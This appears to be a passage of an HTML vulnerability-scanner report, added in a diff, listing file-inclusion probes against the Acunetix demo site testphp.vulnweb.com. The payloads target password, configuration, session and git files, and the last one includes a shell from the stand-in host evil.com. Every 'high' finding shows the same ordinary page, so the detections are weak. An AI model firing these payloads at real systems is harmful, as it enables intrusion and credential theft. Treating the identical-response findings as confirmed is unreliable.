+    </div>
+
+    <div class="vulnerability high">
+        <h3>27. Local/Remote File Inclusion <span class="severity-high">(high)</span></h3>
+        <p><strong>URL:</strong> <a href="http://testphp.vulnweb.com/artists.php?artist=1&page=/var/log/apache2/access.log" target="_blank">http://testphp.vulnweb.com/artists.php?artist=1&page=/var/log/apache2/access.log</a></p>
+        <p><strong>Description:</strong> Possible LFI/RFI vulnerability detected - Apache access log in parameter 'page'</p>
+        <p><strong>Payload:</strong> <code>/var/log/apache2/access.log</code></p>
+        <p><strong>Response Snippet:</strong></p>
+        <pre><!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
+"http://www.w3.org/TR/html4/loose.dtd">
+<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">
+
+<!-- InstanceBeginEditable name="document_title_rgn" -->
+<title>artists</title>
+<!-- InstanceEndEditable -->
+<link rel="stylesheet" href="style.css" type="text/css">
+<!-- InstanceBeginEditable name="headers_rgn" -->
+<!-- here goes headers headers -->
+<!-- InstanceEndEditable -->
+<script language="JavaScript" type="text/JavaScript">
+<!--
+function MM_reloadPage(init) {  //reloads the window if Nav4 resized
+  if (init==true) with (navigator) {if ((appName=="Netscape")&&(parseInt(appVersion)==4)) {
+    document.MM_pgW=innerWidth; document.MM_pgH=innerHeight; onresize=MM_reloadPage; }}
+  else if (innerWidth!=document.MM_pgW || innerHeight!=document.MM_pgH) location.reload();
+}
+MM_reloadPage(true);
+//-->
+</script>
+
+</head>
+<body> 
+<div id="mainLayer" style="position:absolute; width:700px; z-index:1">
+<div id="masthead"> 
+  <h1 id="siteName"><a href="https://www.acunetix.com/"><img src="images/logo.gif" width="306" height="38" border="0" alt="Acunetix website security"></a></h1>   
+  <h6 id="siteInfo">TEST and Demonstration site for <a href="https://www.acunetix.com/vulnerability-scanner/">Acunetix Web Vulnerability Scanner</a></h6>
+  <div id="globalNav"> 
+      	<table border="0" cellpadding="0" cellspacing="0" width="100%"><tr>
+	<td align="left">
+		<a href="index.php">home</a> | <a href="categories.php">categories</a> | <a href="artists.php">artists
+		</a> | <a href="disclaimer.php">disclaimer</a> | <a href="cart.php">your cart</a> | 
+		<a href="guestbook.php">guestbook</a> | 
+		<a href="AJAX/index.php">AJAX Demo</a>
+	</td>
+	<td align="right">
+		</td>
+	</tr></table>
+  </div> 
+</div> 
+<!-- end masthead --> 
+
+<!-- begin content -->
+<!-- InstanceBeginEditable name="content_rgn" -->
+</pre>
+        <p><em>Detected at: 2025-09-14 21:08:36</em></p>
+    </div>
+
+    <div class="vulnerability high">
+        <h3>28. Local/Remote File Inclusion <span class="severity-high">(high)</span></h3>
+        <p><strong>URL:</strong> <a href="http://testphp.vulnweb.com/artists.php?artist=1&page=/var/log/apache/access.log" target="_blank">http://testphp.vulnweb.com/artists.php?artist=1&page=/var/log/apache/access.log</a></p>
+        <p><strong>Description:</strong> Possible LFI/RFI vulnerability detected - Alternative Apache access log in parameter 'page'</p>
+        <p><strong>Payload:</strong> <code>/var/log/apache/access.log</code></p>
+        <p><strong>Response Snippet:</strong></p>
+        <pre><!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
+"http://www.w3.org/TR/html4/loose.dtd">
+<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">
+
+<!-- InstanceBeginEditable name="document_title_rgn" -->
+<title>artists</title>
+<!-- InstanceEndEditable -->
+<link rel="stylesheet" href="style.css" type="text/css">
+<!-- InstanceBeginEditable name="headers_rgn" -->
+<!-- here goes headers headers -->
+<!-- InstanceEndEditable -->
+<script language="JavaScript" type="text/JavaScript">
+<!--
+function MM_reloadPage(init) {  //reloads the window if Nav4 resized
+  if (init==true) with (navigator) {if ((appName=="Netscape")&&(parseInt(appVersion)==4)) {
+    document.MM_pgW=innerWidth; document.MM_pgH=innerHeight; onresize=MM_reloadPage; }}
+  else if (innerWidth!=document.MM_pgW || innerHeight!=document.MM_pgH) location.reload();
+}
+MM_reloadPage(true);
+//-->
+</script>
+
+</head>
+<body> 
+<div id="mainLayer" style="position:absolute; width:700px; z-index:1">
+<div id="masthead"> 
+  <h1 id="siteName"><a href="https://www.acunetix.com/"><img src="images/logo.gif" width="306" height="38" border="0" alt="Acunetix website security"></a></h1>   
+  <h6 id="siteInfo">TEST and Demonstration site for <a href="https://www.acunetix.com/vulnerability-scanner/">Acunetix Web Vulnerability Scanner</a></h6>
+  <div id="globalNav"> 
+      	<table border="0" cellpadding="0" cellspacing="0" width="100%"><tr>
+	<td align="left">
+		<a href="index.php">home</a> | <a href="categories.php">categories</a> | <a href="artists.php">artists
+		</a> | <a href="disclaimer.php">disclaimer</a> | <a href="cart.php">your cart</a> | 
+		<a href="guestbook.php">guestbook</a> | 
+		<a href="AJAX/index.php">AJAX Demo</a>
+	</td>
+	<td align="right">
+		</td>
+	</tr></table>
+  </div> 
+</div> 
+<!-- end masthead --> 
+
+<!-- begin content -->
+<!-- InstanceBeginEditable name="content_rgn" -->
+</pre>
+        <p><em>Detected at: 2025-09-14 21:08:37</em></p>
+    </div>
+
+    <div class="vulnerability high">
+        <h3>29. Local/Remote File Inclusion <span class="severity-high">(high)</span></h3>
+        <p><strong>URL:</strong> <a href="http://testphp.vulnweb.com/artists.php?artist=1&page=/var/log/nginx/access.log" target="_blank">http://testphp.vulnweb.com/artists.php?artist=1&page=/var/log/nginx/access.log</a></p>
+        <p><strong>Description:</strong> Possible LFI/RFI vulnerability detected - Nginx access log in parameter 'page'</p>
+        <p><strong>Payload:</strong> <code>/var/log/nginx/access.log</code></p>
+        <p><strong>Response Snippet:</strong></p>
+        <pre><!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
+"http://www.w3.org/TR/html4/loose.dtd">
+<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">
+
+<!-- InstanceBeginEditable name="document_title_rgn" -->
+<title>artists</title>
+<!-- InstanceEndEditable -->
+<link rel="stylesheet" href="style.css" type="text/css">
+<!-- InstanceBeginEditable name="headers_rgn" -->
+<!-- here goes headers headers -->
+<!-- InstanceEndEditable -->
+<script language="JavaScript" type="text/JavaScript">
+<!--
+function MM_reloadPage(init) {  //reloads the window if Nav4 resized
+  if (init==true) with (navigator) {if ((appName=="Netscape")&&(parseInt(appVersion)==4)) {
+    document.MM_pgW=innerWidth; document.MM_pgH=innerHeight; onresize=MM_reloadPage; }}
+  else if (innerWidth!=document.MM_pgW || innerHeight!=document.MM_pgH) location.reload();
+}
+MM_reloadPage(true);
+//-->
+</script>
+
+</head>
+<body> 
+<div id="mainLayer" style="position:absolute; width:700px; z-index:1">
+<div id="masthead"> 
+  <h1 id="siteName"><a href="https://www.acunetix.com/"><img src="images/logo.gif" width="306" height="38" border="0" alt="Acunetix website security"></a></h1>   
+  <h6 id="siteInfo">TEST and Demonstration site for <a href="https://www.acunetix.com/vulnerability-scanner/">Acunetix Web Vulnerability Scanner</a></h6>
+  <div id="globalNav"> 
+      	<table border="0" cellpadding="0" cellspacing="0" width="100%"><tr>
+	<td align="left">
+		<a href="index.php">home</a> | <a href="categories.php">categories</a> | <a href="artists.php">artists
+		</a> | <a href="disclaimer.php">disclaimer</a> | <a href="cart.php">your cart</a> | 
+		<a href="guestbook.php">guestbook</a> | 
+		<a href="AJAX/index.php">AJAX Demo</a>
+	</td>
+	<td align="right">
+		</td>
+	</tr></table>
+  </div> 
+</div> 
+<!-- end masthead --> 
+
+<!-- begin content -->
+<!-- InstanceBeginEditable name="content_rgn" -->
+</pre>
+        <p><em>Detected at: 2025-09-14 21:08:37</em></p>
+    </div>
+
+    <div class="vulnerability high">
+        <h3>30. Local/Remote File Inclusion <span class="severity-high">(high)</span></h3>
+        <p><strong>URL:</strong> <a href="http://testphp.vulnweb.com/artists.php?artist=1&page=/.htaccess" target="_blank">http://testphp.vulnweb.com/artists.php?artist=1&page=/.htaccess</a></p>
+        <p><strong>Description:</strong> Possible LFI/RFI vulnerability detected - Apache configuration in parameter 'page'</p>
+        <p><strong>Payload:</strong> <code>/.htaccess</code></p>
+        <p><strong>Response Snippet:</strong></p>
+        <pre><!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
+"http://www.w3.org/TR/html4/loose.dtd">
+<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">
+
+<!-- InstanceBeginEditable name="document_title_rgn" -->
+<title>artists</title>
+<!-- InstanceEndEditable -->
+<link rel="stylesheet" href="style.css" type="text/css">
+<!-- InstanceBeginEditable name="headers_rgn" -->
+<!-- here goes headers headers -->
+<!-- InstanceEndEditable -->
+<script language="JavaScript" type="text/JavaScript">
+<!--
+function MM_reloadPage(init) {  //reloads the window if Nav4 resized
+  if (init==true) with (navigator) {if ((appName=="Netscape")&&(parseInt(appVersion)==4)) {
+    document.MM_pgW=innerWidth; document.MM_pgH=innerHeight; onresize=MM_reloadPage; }}
+  else if (innerWidth!=document.MM_pgW || innerHeight!=document.MM_pgH) location.reload();
+}
+MM_reloadPage(true);
+//-->
+</script>
+
+</head>
+<body> 
+<div id="mainLayer" style="position:absolute; width:700px; z-index:1">
+<div id="masthead"> 
+  <h1 id="siteName"><a href="https://www.acunetix.com/"><img src="images/logo.gif" width="306" height="38" border="0" alt="Acunetix website security"></a></h1>   
+  <h6 id="siteInfo">TEST and Demonstration site for <a href="https://www.acunetix.com/vulnerability-scanner/">Acunetix Web Vulnerability Scanner</a></h6>
+  <div id="globalNav"> 
+      	<table border="0" cellpadding="0" cellspacing="0" width="100%"><tr>
+	<td align="left">
+		<a href="index.php">home</a> | <a href="categories.php">categories</a> | <a href="artists.php">artists
+		</a> | <a href="disclaimer.php">disclaimer</a> | <a href="cart.php">your cart</a> | 
+		<a href="guestbook.php">guestbook</a> | 
+		<a href="AJAX/index.php">AJAX Demo</a>
+	</td>
+	<td align="right">
+		</td>
+	</tr></table>
+  </div> 
+</div> 
+<!-- end masthead --> 
+
+<!-- begin content -->
+<!-- InstanceBeginEditable name="content_rgn" -->
+</pre>
+        <p><em>Detected at: 2025-09-14 21:08:38</em></p>
+    </div>
+
+    <div class="vulnerability high">
+        <h3>31. Local/Remote File Inclusion <span class="severity-high">(high)</span></h3>
+        <p><strong>URL:</strong> <a href="http://testphp.vulnweb.com/artists.php?artist=1&page=/.htpasswd" target="_blank">http://testphp.vulnweb.com/artists.php?artist=1&page=/.htpasswd</a></p>
+        <p><strong>Description:</strong> Possible LFI/RFI vulnerability detected - Apache password file in parameter 'page'</p>
+        <p><strong>Payload:</strong> <code>/.htpasswd</code></p>
+        <p><strong>Response Snippet:</strong></p>
+        <pre><!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
+"http://www.w3.org/TR/html4/loose.dtd">
+<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">
+
+<!-- InstanceBeginEditable name="document_title_rgn" -->
+<title>artists</title>
+<!-- InstanceEndEditable -->
+<link rel="stylesheet" href="style.css" type="text/css">
+<!-- InstanceBeginEditable name="headers_rgn" -->
+<!-- here goes headers headers -->
+<!-- InstanceEndEditable -->
+<script language="JavaScript" type="text/JavaScript">
+<!--
+function MM_reloadPage(init) {  //reloads the window if Nav4 resized
+  if (init==true) with (navigator) {if ((appName=="Netscape")&&(parseInt(appVersion)==4)) {
+    document.MM_pgW=innerWidth; document.MM_pgH=innerHeight; onresize=MM_reloadPage; }}
+  else if (innerWidth!=document.MM_pgW || innerHeight!=document.MM_pgH) location.reload();
+}
+MM_reloadPage(true);
+//-->
+</script>
+
+</head>
+<body> 
+<div id="mainLayer" style="position:absolute; width:700px; z-index:1">
+<div id="masthead"> 
+  <h1 id="siteName"><a href="https://www.acunetix.com/"><img src="images/logo.gif" width="306" height="38" border="0" alt="Acunetix website security"></a></h1>   
+  <h6 id="siteInfo">TEST and Demonstration site for <a href="https://www.acunetix.com/vulnerability-scanner/">Acunetix Web Vulnerability Scanner</a></h6>
+  <div id="globalNav"> 
+      	<table border="0" cellpadding="0" cellspacing="0" width="100%"><tr>
+	<td align="left">
+		<a href="index.php">home</a> | <a href="categories.php">categories</a> | <a href="artists.php">artists
+		</a> | <a href="disclaimer.php">disclaimer</a> | <a href="cart.php">your cart</a> | 
+		<a href="guestbook.php">guestbook</a> | 
+		<a href="AJAX/index.php">AJAX Demo</a>
+	</td>
+	<td align="right">
+		</td>
+	</tr></table>
+  </div> 
+</div> 
+<!-- end masthead --> 
+
+<!-- begin content -->
+<!-- InstanceBeginEditable name="content_rgn" -->
+</pre>
+        <p><em>Detected at: 2025-09-14 21:08:39</em></p>
+    </div>
+
+    <div class="vulnerability high">
+        <h3>32. Local/Remote File Inclusion <span class="severity-high">(high)</span></h3>
+        <p><strong>URL:</strong> <a href="http://testphp.vulnweb.com/artists.php?artist=1&page=/web.config" target="_blank">http://testphp.vulnweb.com/artists.php?artist=1&page=/web.config</a></p>
+        <p><strong>Description:</strong> Possible LFI/RFI vulnerability detected - IIS configuration in parameter 'page'</p>
+        <p><strong>Payload:</strong> <code>/web.config</code></p>
+        <p><strong>Response Snippet:</strong></p>
+        <pre><!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
+"http://www.w3.org/TR/html4/loose.dtd">
+<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">
+
+<!-- InstanceBeginEditable name="document_title_rgn" -->
+<title>artists</title>
+<!-- InstanceEndEditable -->
+<link rel="stylesheet" href="style.css" type="text/css">
+<!-- InstanceBeginEditable name="headers_rgn" -->
+<!-- here goes headers headers -->
+<!-- InstanceEndEditable -->
+<script language="JavaScript" type="text/JavaScript">
+<!--
+function MM_reloadPage(init) {  //reloads the window if Nav4 resized
+  if (init==true) with (navigator) {if ((appName=="Netscape")&&(parseInt(appVersion)==4)) {
+    document.MM_pgW=innerWidth; document.MM_pgH=innerHeight; onresize=MM_reloadPage; }}
+  else if (innerWidth!=document.MM_pgW || innerHeight!=document.MM_pgH) location.reload();
+}
+MM_reloadPage(true);
+//-->
+</script>
+
+</head>
+<body> 
+<div id="mainLayer" style="position:absolute; width:700px; z-index:1">
+<div id="masthead"> 
+  <h1 id="siteName"><a href="https://www.acunetix.com/"><img src="images/logo.gif" width="306" height="38" border="0" alt="Acunetix website security"></a></h1>   
+  <h6 id="siteInfo">TEST and Demonstration site for <a href="https://www.acunetix.com/vulnerability-scanner/">Acunetix Web Vulnerability Scanner</a></h6>
+  <div id="globalNav"> 
+      	<table border="0" cellpadding="0" cellspacing="0" width="100%"><tr>
+	<td align="left">
+		<a href="index.php">home</a> | <a href="categories.php">categories</a> | <a href="artists.php">artists
+		</a> | <a href="disclaimer.php">disclaimer</a> | <a href="cart.php">your cart</a> | 
+		<a href="guestbook.php">guestbook</a> | 
+		<a href="AJAX/index.php">AJAX Demo</a>
+	</td>
+	<td align="right">
+		</td>
+	</tr></table>
+  </div> 
+</div> 
+<!-- end masthead --> 
+
+<!-- begin content -->
+<!-- InstanceBeginEditable name="content_rgn" -->
+</pre>
+        <p><em>Detected at: 2025-09-14 21:08:39</em></p>
+    </div>
+
+    <div class="vulnerability high">
+        <h3>33. Local/Remote File Inclusion <span class="severity-high">(high)</span></h3>
+        <p><strong>URL:</strong> <a href="http://testphp.vulnweb.com/artists.php?artist=1&page=/var/lib/php/sess_%5BSESSION_ID%5D" target="_blank">http://testphp.vulnweb.com/artists.php?artist=1&page=/var/lib/php/sess_%5BSESSION_ID%5D</a></p>
+        <p><strong>Description:</strong> Possible LFI/RFI vulnerability detected - PHP session file in parameter 'page'</p>
+        <p><strong>Payload:</strong> <code>/var/lib/php/sess_[SESSION_ID]</code></p>
+        <p><strong>Response Snippet:</strong></p>
+        <pre><!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
+"http://www.w3.org/TR/html4/loose.dtd">
+<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">
+
+<!-- InstanceBeginEditable name="document_title_rgn" -->
+<title>artists</title>
+<!-- InstanceEndEditable -->
+<link rel="stylesheet" href="style.css" type="text/css">
+<!-- InstanceBeginEditable name="headers_rgn" -->
+<!-- here goes headers headers -->
+<!-- InstanceEndEditable -->
+<script language="JavaScript" type="text/JavaScript">
+<!--
+function MM_reloadPage(init) {  //reloads the window if Nav4 resized
+  if (init==true) with (navigator) {if ((appName=="Netscape")&&(parseInt(appVersion)==4)) {
+    document.MM_pgW=innerWidth; document.MM_pgH=innerHeight; onresize=MM_reloadPage; }}
+  else if (innerWidth!=document.MM_pgW || innerHeight!=document.MM_pgH) location.reload();
+}
+MM_reloadPage(true);
+//-->
+</script>
+
+</head>
+<body> 
+<div id="mainLayer" style="position:absolute; width:700px; z-index:1">
+<div id="masthead"> 
+  <h1 id="siteName"><a href="https://www.acunetix.com/"><img src="images/logo.gif" width="306" height="38" border="0" alt="Acunetix website security"></a></h1>   
+  <h6 id="siteInfo">TEST and Demonstration site for <a href="https://www.acunetix.com/vulnerability-scanner/">Acunetix Web Vulnerability Scanner</a></h6>
+  <div id="globalNav"> 
+      	<table border="0" cellpadding="0" cellspacing="0" width="100%"><tr>
+	<td align="left">
+		<a href="index.php">home</a> | <a href="categories.php">categories</a> | <a href="artists.php">artists
+		</a> | <a href="disclaimer.php">disclaimer</a> | <a href="cart.php">your cart</a> | 
+		<a href="guestbook.php">guestbook</a> | 
+		<a href="AJAX/index.php">AJAX Demo</a>
+	</td>
+	<td align="right">
+		</td>
+	</tr></table>
+  </div> 
+</div> 
+<!-- end masthead --> 
+
+<!-- begin content -->
+<!-- InstanceBeginEditable name="content_rgn" -->
+</pre>
+        <p><em>Detected at: 2025-09-14 21:08:40</em></p>
+    </div>
+
+    <div class="vulnerability high">
+        <h3>34. Local/Remote File Inclusion <span class="severity-high">(high)</span></h3>
+        <p><strong>URL:</strong> <a href="http://testphp.vulnweb.com/artists.php?artist=1&page=/tmp/sess_%5BSESSION_ID%5D" target="_blank">http://testphp.vulnweb.com/artists.php?artist=1&page=/tmp/sess_%5BSESSION_ID%5D</a></p>
+        <p><strong>Description:</strong> Possible LFI/RFI vulnerability detected - Alternative PHP session file in parameter 'page'</p>
+        <p><strong>Payload:</strong> <code>/tmp/sess_[SESSION_ID]</code></p>
+        <p><strong>Response Snippet:</strong></p>
+        <pre><!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
+"http://www.w3.org/TR/html4/loose.dtd">
+<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">
+
+<!-- InstanceBeginEditable name="document_title_rgn" -->
+<title>artists</title>
+<!-- InstanceEndEditable -->
+<link rel="stylesheet" href="style.css" type="text/css">
+<!-- InstanceBeginEditable name="headers_rgn" -->
+<!-- here goes headers headers -->
+<!-- InstanceEndEditable -->
+<script language="JavaScript" type="text/JavaScript">
+<!--
+function MM_reloadPage(init) {  //reloads the window if Nav4 resized
+  if (init==true) with (navigator) {if ((appName=="Netscape")&&(parseInt(appVersion)==4)) {
+    document.MM_pgW=innerWidth; document.MM_pgH=innerHeight; onresize=MM_reloadPage; }}
+  else if (innerWidth!=document.MM_pgW || innerHeight!=document.MM_pgH) location.reload();
+}
+MM_reloadPage(true);
+//-->
+</script>
+
+</head>
+<body> 
+<div id="mainLayer" style="position:absolute; width:700px; z-index:1">
+<div id="masthead"> 
+  <h1 id="siteName"><a href="https://www.acunetix.com/"><img src="images/logo.gif" width="306" height="38" border="0" alt="Acunetix website security"></a></h1>   
+  <h6 id="siteInfo">TEST and Demonstration site for <a href="https://www.acunetix.com/vulnerability-scanner/">Acunetix Web Vulnerability Scanner</a></h6>
+  <div id="globalNav"> 
+      	<table border="0" cellpadding="0" cellspacing="0" width="100%"><tr>
+	<td align="left">
+		<a href="index.php">home</a> | <a href="categories.php">categories</a> | <a href="artists.php">artists
+		</a> | <a href="disclaimer.php">disclaimer</a> | <a href="cart.php">your cart</a> | 
+		<a href="guestbook.php">guestbook</a> | 
+		<a href="AJAX/index.php">AJAX Demo</a>
+	</td>
+	<td align="right">
+		</td>
+	</tr></table>
+  </div> 
+</div> 
+<!-- end masthead --> 
+
+<!-- begin content -->
+<!-- InstanceBeginEditable name="content_rgn" -->
+</pre>
+        <p><em>Detected at: 2025-09-14 21:08:41</em></p>
+    </div>
+
+    <div class="vulnerability high">
+        <h3>35. Local/Remote File Inclusion <span class="severity-high">(high)</span></h3>
+        <p><strong>URL:</strong> <a href="http://testphp.vulnweb.com/artists.php?artist=1&page=/index.php.bak" target="_blank">http://testphp.vulnweb.com/artists.php?artist=1&page=/index.php.bak</a></p>
+        <p><strong>Description:</strong> Possible LFI/RFI vulnerability detected - Backup file in parameter 'page'</p>
+        <p><strong>Payload:</strong> <code>/index.php.bak</code></p>
+        <p><strong>Response Snippet:</strong></p>
+        <pre><!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
+"http://www.w3.org/TR/html4/loose.dtd">
+<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">
+
+<!-- InstanceBeginEditable name="document_title_rgn" -->
+<title>artists</title>
+<!-- InstanceEndEditable -->
+<link rel="stylesheet" href="style.css" type="text/css">
+<!-- InstanceBeginEditable name="headers_rgn" -->
+<!-- here goes headers headers -->
+<!-- InstanceEndEditable -->
+<script language="JavaScript" type="text/JavaScript">
+<!--
+function MM_reloadPage(init) {  //reloads the window if Nav4 resized
+  if (init==true) with (navigator) {if ((appName=="Netscape")&&(parseInt(appVersion)==4)) {
+    document.MM_pgW=innerWidth; document.MM_pgH=innerHeight; onresize=MM_reloadPage; }}
+  else if (innerWidth!=document.MM_pgW || innerHeight!=document.MM_pgH) location.reload();
+}
+MM_reloadPage(true);
+//-->
+</script>
+
+</head>
+<body> 
+<div id="mainLayer" style="position:absolute; width:700px; z-index:1">
+<div id="masthead"> 
+  <h1 id="siteName"><a href="https://www.acunetix.com/"><img src="images/logo.gif" width="306" height="38" border="0" alt="Acunetix website security"></a></h1>   
+  <h6 id="siteInfo">TEST and Demonstration site for <a href="https://www.acunetix.com/vulnerability-scanner/">Acunetix Web Vulnerability Scanner</a></h6>
+  <div id="globalNav"> 
+      	<table border="0" cellpadding="0" cellspacing="0" width="100%"><tr>
+	<td align="left">
+		<a href="index.php">home</a> | <a href="categories.php">categories</a> | <a href="artists.php">artists
+		</a> | <a href="disclaimer.php">disclaimer</a> | <a href="cart.php">your cart</a> | 
+		<a href="guestbook.php">guestbook</a> | 
+		<a href="AJAX/index.php">AJAX Demo</a>
+	</td>
+	<td align="right">
+		</td>
+	</tr></table>
+  </div> 
+</div> 
+<!-- end masthead --> 
+
+<!-- begin content -->
+<!-- InstanceBeginEditable name="content_rgn" -->
+</pre>
+        <p><em>Detected at: 2025-09-14 21:08:41</em></p>
+    </div>
+
+    <div class="vulnerability high">
+        <h3>36. Local/Remote File Inclusion <span class="severity-high">(high)</span></h3>
+        <p><strong>URL:</strong> <a href="http://testphp.vulnweb.com/artists.php?artist=1&page=/index.php~" target="_blank">http://testphp.vulnweb.com/artists.php?artist=1&page=/index.php~</a></p>
+        <p><strong>Description:</strong> Possible LFI/RFI vulnerability detected - Temporary backup file in parameter 'page'</p>
+        <p><strong>Payload:</strong> <code>/index.php~</code></p>
+        <p><strong>Response Snippet:</strong></p>
+        <pre><!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
+"http://www.w3.org/TR/html4/loose.dtd">
+<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">
+
+<!-- InstanceBeginEditable name="document_title_rgn" -->
+<title>artists</title>
+<!-- InstanceEndEditable -->
+<link rel="stylesheet" href="style.css" type="text/css">
+<!-- InstanceBeginEditable name="headers_rgn" -->
+<!-- here goes headers headers -->
+<!-- InstanceEndEditable -->
+<script language="JavaScript" type="text/JavaScript">
+<!--
+function MM_reloadPage(init) {  //reloads the window if Nav4 resized
+  if (init==true) with (navigator) {if ((appName=="Netscape")&&(parseInt(appVersion)==4)) {
+    document.MM_pgW=innerWidth; document.MM_pgH=innerHeight; onresize=MM_reloadPage; }}
+  else if (innerWidth!=document.MM_pgW || innerHeight!=document.MM_pgH) location.reload();
+}
+MM_reloadPage(true);
+//-->
+</script>
+
+</head>
+<body> 
+<div id="mainLayer" style="position:absolute; width:700px; z-index:1">
+<div id="masthead"> 
+  <h1 id="siteName"><a href="https://www.acunetix.com/"><img src="images/logo.gif" width="306" height="38" border="0" alt="Acunetix website security"></a></h1>   
+  <h6 id="siteInfo">TEST and Demonstration site for <a href="https://www.acunetix.com/vulnerability-scanner/">Acunetix Web Vulnerability Scanner</a></h6>
+  <div id="globalNav"> 
+      	<table border="0" cellpadding="0" cellspacing="0" width="100%"><tr>
+	<td align="left">
+		<a href="index.php">home</a> | <a href="categories.php">categories</a> | <a href="artists.php">artists
+		</a> | <a href="disclaimer.php">disclaimer</a> | <a href="cart.php">your cart</a> | 
+		<a href="guestbook.php">guestbook</a> | 
+		<a href="AJAX/index.php">AJAX Demo</a>
+	</td>
+	<td align="right">
+		</td>
+	</tr></table>
+  </div> 
+</div> 
+<!-- end masthead --> 
+
+<!-- begin content -->
+<!-- InstanceBeginEditable name="content_rgn" -->
+</pre>
+        <p><em>Detected at: 2025-09-14 21:08:42</em></p>
+    </div>
+
+    <div class="vulnerability high">
+        <h3>37. Local/Remote File Inclusion <span class="severity-high">(high)</span></h3>
+        <p><strong>URL:</strong> <a href="http://testphp.vulnweb.com/artists.php?artist=1&page=/.git/HEAD" target="_blank">http://testphp.vulnweb.com/artists.php?artist=1&page=/.git/HEAD</a></p>
+        <p><strong>Description:</strong> Possible LFI/RFI vulnerability detected - Git metadata in parameter 'page'</p>
+        <p><strong>Payload:</strong> <code>/.git/HEAD</code></p>
+        <p><strong>Response Snippet:</strong></p>
+        <pre><!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
+"http://www.w3.org/TR/html4/loose.dtd">
+<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">
+
+<!-- InstanceBeginEditable name="document_title_rgn" -->
+<title>artists</title>
+<!-- InstanceEndEditable -->
+<link rel="stylesheet" href="style.css" type="text/css">
+<!-- InstanceBeginEditable name="headers_rgn" -->
+<!-- here goes headers headers -->
+<!-- InstanceEndEditable -->
+<script language="JavaScript" type="text/JavaScript">
+<!--
+function MM_reloadPage(init) {  //reloads the window if Nav4 resized
+  if (init==true) with (navigator) {if ((appName=="Netscape")&&(parseInt(appVersion)==4)) {
+    document.MM_pgW=innerWidth; document.MM_pgH=innerHeight; onresize=MM_reloadPage; }}
+  else if (innerWidth!=document.MM_pgW || innerHeight!=document.MM_pgH) location.reload();
+}
+MM_reloadPage(true);
+//-->
+</script>
+
+</head>
+<body> 
+<div id="mainLayer" style="position:absolute; width:700px; z-index:1">
+<div id="masthead"> 
+  <h1 id="siteName"><a href="https://www.acunetix.com/"><img src="images/logo.gif" width="306" height="38" border="0" alt="Acunetix website security"></a></h1>   
+  <h6 id="siteInfo">TEST and Demonstration site for <a href="https://www.acunetix.com/vulnerability-scanner/">Acunetix Web Vulnerability Scanner</a></h6>
+  <div id="globalNav"> 
+      	<table border="0" cellpadding="0" cellspacing="0" width="100%"><tr>
+	<td align="left">
+		<a href="index.php">home</a> | <a href="categories.php">categories</a> | <a href="artists.php">artists
+		</a> | <a href="disclaimer.php">disclaimer</a> | <a href="cart.php">your cart</a> | 
+		<a href="guestbook.php">guestbook</a> | 
+		<a href="AJAX/index.php">AJAX Demo</a>
+	</td>
+	<td align="right">
+		</td>
+	</tr></table>
+  </div> 
+</div> 
+<!-- end masthead --> 
+
+<!-- begin content -->
+<!-- InstanceBeginEditable name="content_rgn" -->
+</pre>
+        <p><em>Detected at: 2025-09-14 21:08:42</em></p>
+    </div>
+
+    <div class="vulnerability high">
+        <h3>38. Local/Remote File Inclusion <span class="severity-high">(high)</span></h3>
+        <p><strong>URL:</strong> <a href="http://testphp.vulnweb.com/artists.php?artist=1&page=http%3A//evil.com/shell.txt" target="_blank">http://testphp.vulnweb.com/artists.php?artist=1&page=http%3A//evil.com/shell.txt</a></p>
+        <p><strong>Description:</strong> Possible LFI/RFI vulnerability detected - Remote file inclusion test in parameter 'page'</p>
+        <p><strong>Payload:</strong> <code>http://evil.com/shell.txt</code></p>
+        <p><strong>Response Snippet:</strong></p>
